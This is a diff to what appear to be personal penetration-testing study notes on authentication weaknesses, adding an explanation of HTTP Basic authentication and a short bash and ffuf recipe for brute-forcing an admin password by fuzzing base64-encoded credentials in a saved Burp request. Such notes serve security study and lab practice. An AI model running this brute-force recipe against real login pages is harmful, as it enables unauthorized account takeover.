@@ -57,9 +57,29 @@ Password Reset Flow Vulnerabilities
 		- Multiple tokens existing at the same time
 		- Life span is too long 
 
+![](mozilla-http-auth.png)
+[RFC 7235](https://datatracker.ietf.org/doc/html/rfc7235) defines the HTTP authentication framework
+[RFC 7617](https://datatracker.ietf.org/doc/html/rfc7617) defines the  HTTP Basic Authentication
+
+```html
+Authorization: Basic <credentials>
+Authorization: Basic YWRtaW46cGFzc3dvcmQ=
+```
+
+Create base64 wordlist, save a a login request in [[BurpSuite]] and then use `ffuf` [[FFUF-Cheatsheet]]
+```bash
+# Get a password list wordlist, have targeted user account name
+cat $passwords.txt | awk '{print "admin:"$1}' | tee -a adminpass-ct.txt
+for i in $(cat adminpass-ct.txt); do echo -n $i | base64 | tee -a adminpass-b64.txt; done
+# Save a request from burpsuite as login.req
+# Edit login.req and replace the base64 string with FUZZ
+ffuf -request-proto http -request login.req -w adminpass-b64.txt # and extraflags
+```
 
 ## References
 
 [THM Enumeration Bruteforce Room](https://tryhackme.com/r/room/enumerationbruteforce)
 [csrc.nist.gov Glossary MFA](https://csrc.nist.gov/glossary/term/multi_factor_authentication)
 [HackTricks - Registration Vulnerabilities](https://book.hacktricks.xyz/pentesting-web/registration-vulnerabilities)
+[RFC 7617](https://datatracker.ietf.org/doc/html/rfc7617)
+[RFC 7235](https://datatracker.ietf.org/doc/html/rfc7235)
